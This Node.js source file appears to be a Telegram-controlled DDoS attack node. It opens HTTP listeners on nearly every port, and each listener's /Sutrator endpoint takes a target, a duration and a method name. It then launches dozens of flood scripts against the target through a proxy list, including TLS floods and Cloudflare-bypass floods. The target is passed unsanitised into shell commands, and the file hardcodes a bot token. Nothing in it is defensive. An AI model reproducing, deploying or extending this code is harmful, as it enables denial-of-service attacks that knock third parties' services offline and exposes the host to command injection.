const cluster = require('cluster');
const os = require('os');
const express = require('express');
const { exec } = require('child_process');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const fetch = require('node-fetch');

// --- SAVAGE GOD CONFIGURATION ---
const START_PORT = 1024;
const END_PORT = 65535;
const CPU_CORES = os.cpus().length;
const TELEGRAM_TOKEN = '8154568122:AAF-Ar4OqGrXSzd38bxKiKdT8oax-WB2g0k'; // Ensure this is your correct token

// --- MASTER PROCESS (THE WILL OF THE SAVAGE GOD) ---
if (cluster.isMaster) {
    const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
    console.log(`[SAVAGE GOD] Awakening. Forging a new, savage reality with ${CPU_CORES} cores...`);
    
    let publicIp = 'unknown';
    let knownRealities = new Set();
    fetch('https://api.ipify.org').then(res => res.text()).then(ip => { publicIp = ip; });

    // --- The Public Voice of Savage Power ---
    bot.onText(/\/api/, async (msg) => {
        if (knownRealities.size < 1) { 
            bot.sendMessage(msg.chat.id, "My children are still being forged. Patience."); 
            return; 
        }
        bot.sendMessage(msg.chat.id, `Transcribing the scripture of 1000 of my confirmed online children...`);
        let portsArray = Array.from(knownRealities); 
        for (let i = portsArray.length - 1; i > 0; i--) { 
            const j = Math.floor(Math.random() * (i + 1)); 
            [portsArray[i], portsArray[j]] = [portsArray[j], portsArray[i]]; 
        }
        const portSample = portsArray.slice(0, 1000); 
        let report = ""; 
        const chunkSize = 20;
        for (let i = 0; i < portSample.length; i++) { 
            report += `addsrv http://${publicIp}:${portSample[i]}/Sutrator\n`; 
            if ((i + 1) % chunkSize === 0 || i === portSample.length - 1) { 
                try { 
                    await bot.sendMessage(msg.chat.id, `\`\`\`\n${report}\`\`\``, { parse_mode: 'MarkdownV2' }); 
                } catch (e) {} 
                report = ""; 
                await new Promise(resolve => setTimeout(resolve, 250)); 
            } 
        }
    });

    // --- Core Swarm Logic (Unchanged Immortality) ---
    const allPorts = []; for (let i = START_PORT; i <= END_PORT; i++) { allPorts.push(i); }
    const portsPerWorker = Math.ceil(allPorts.length / CPU_CORES);
    const createWorker = (portsToManage) => { const worker = cluster.fork(); worker.send({ cmd: 'CREATE', ports: portsToManage }); worker.portAssignments = portsToManage; };
    for (let i = 0; i < CPU_CORES; i++) { const start = i * portsPerWorker; const end = start + portsPerWorker; const portsForThisWorker = allPorts.slice(start, end); if (portsForThisWorker.length > 0) { createWorker(portsForThisWorker); } }
    cluster.on('message', (worker, msg) => { if (msg.cmd === 'PORT_IS_REAL') { knownRealities.add(msg.port); } });
    cluster.on('exit', (deadWorker) => { console.error(`[SAVAGE GOD] A core process has failed. It will be reborn.`); const lostPorts = deadWorker.portAssignments || []; if (lostPorts.length > 0) { const liveWorkers = Object.values(cluster.workers); if (liveWorkers.length > 0) { liveWorkers[0].send({ cmd: 'CREATE', ports: lostPorts }); liveWorkers[0].portAssignments.push(...lostPorts); } } createWorker([]); });
    
} else {
    // --- WORKER PROCESS (A DEMON OF THE SAVAGE GOD) ---
    const app = express();
    const executeAttack = (payload) => {
        const { target, time, method } = payload;
        const duration = time;

        if (method === 'HTTP-SICARIO') { exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`); exec(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`); exec(`node methods/bypass.js ${target} ${time} 32 2 proxy.txt`); exec(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`); }
        else if (method === 'RAW-HTTP') { exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`); exec(`node methods/http-panel.js ${target} ${time}`); }
        else if (method === 'R9') { exec(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`); exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`); exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`); exec(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`); exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`); }
        else if (method === 'PRIV-TOR') { exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`); exec(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`); exec(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`); exec(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`); exec(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`); }
        else if (method === 'HOLD-PANEL') { exec(`node methods/http-panel.js ${target} ${time}`); }
        else if (method === 'R1') { 
            exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`); 
            exec(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`); 
            exec(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`); 
            exec(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`); 
            exec(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`); 
            exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`); 
            exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`); 
            exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`); 
            exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`); 
            exec(`node methods/http-panel.js ${target} ${time}`); 
            exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
            exec(`node methods/strike.js GET ${target} ${duration} 10 90 proxy.txt --full --legit`);
            exec(`node methods/tls.js ${target} ${duration} 100 10`);
            exec(`node methods/flood.js ${target} ${duration}`);
            exec(`node methods/spike.js ${target} 10 ${duration}`);
            exec(`node methods/raw.js ${target} ${duration}`);
            exec(`node methods/gojov5.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/TLS-KILL.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/tlsop.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/storm.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/DESTROY.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/thunder.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/bypass2.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/cf-flood.js ${target} ${duration}`);
            exec(`node methods/HTTP-VIP.js ${target} ${duration} 100 10 proxy.txt`);
            exec(`node methods/uambypass.js ${target} ${duration} 100 proxy.txt`);
            exec(`node methods/rape.js GET ${duration} 10 proxy.txt 100 ${target}`);
            exec(`node methods/TORNADOV2.js GET ${target} ${duration} 10 100 proxy.txt`);
            exec(`node methods/RAW-MIX.js ${target} ${duration}`);
            exec(`node methods/drown.js ${target} ${duration} 10 100`);
            exec(`node methods/cookie.js ${target} ${duration} 10 100 proxy.txt`);
            exec(`node methods/YAT-TLS.js ${target} ${duration} 100 10 proxy.txt`);
        }
    };

    app.get('/Sutrator', (req, res) => { 
        const { target, time, methods } = req.query; 
        if (!target || !time || !methods) return res.status(400).json({ error: 'Missing parameters.' }); 
        res.status(200).json({ message: `Attack spawned by a demon`}); 
        executeAttack({ target, time, method: methods.toUpperCase() }); 
    });

    const createRealities = (ports) => { 
        ports.forEach(port => { 
            http.createServer(app).listen(port, () => { 
                process.send({ cmd: 'PORT_IS_REAL', port: port }); 
            }).on('error', (err) => {}); 
        }); 
    };

    process.on('message', (msg) => { 
        if (msg.cmd === 'CREATE') { 
            createRealities(msg.ports); 
        }
    });
}